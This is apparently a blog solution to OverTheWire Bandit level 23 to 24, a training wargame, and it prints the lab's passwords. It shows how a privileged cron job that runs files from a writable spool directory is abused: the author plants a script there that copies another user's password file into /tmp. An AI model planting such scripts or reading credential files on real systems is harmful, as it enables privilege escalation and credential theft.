---
title: OverTheWire Bandit Level 23 - 24
date: 2022-07-29T06:00:00
tags: [OverTheWire, Bandit, Linux, shell]
---
# Prompt
> A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

# Solution
```sh
$ ssh bandit23@bandit.labs.overthewire.org -p 2220
bandit23@bandit.labs.overthewire.org password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root cronjob_bandit17_root cronjob_bandit22 cronjob_bandit23 cronjob_bandit24 cronjob_bandit25_root
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*; do
	if [ "$i" != "." -a "$i" != ".." ]; then
		echo "Handling $i"
		owner="$(stat --format "%U" ./$i)"
		if [ "${owner}" = "bandit23" ]; then
			timeout -s 9 60 ./$i
		fi
		rm -f ./$i
	fi
done
bandit23@bandit:~$ ls -l /var/spool/
drwxrwx-wx 25 root bandit24 659456 Jul 29 04:32 bandit24
bandit23@bandit:~$ mkdir /tmp/bandit23
bandit23@bandit:~$ chmod 777 /tmp/bandit23
bandit23@bandit:~$ touch /tmp/bandit23/bandit24.txt
bandit23@bandit:~$ chmod a+rwx /tmp/bandit23/bandit24.txt
bandit23@bandit:~$ printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/bandit23/bandit24.txt\n' > /tmp/bandit23/bandit23.sh
bandit23@bandit:~$ chmod +rx /tmp/bandit23/bandit23.sh
bandit23@bandit:~$ cp /tmp/bandit23/bandit23.sh /var/spool/bandit24
# wait for a minute
bandit23@bandit:~$ cat /tmp/bandit23/bandit24.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

# References
* MayADevBe. (2022, May 24). OverTheWire Bandit Level 23 - 24. MayADevBe. <https://mayadevbe.me/posts/overthewire/bandit/level24/>
* <https://crontab.guru/#*_*_*_*_*>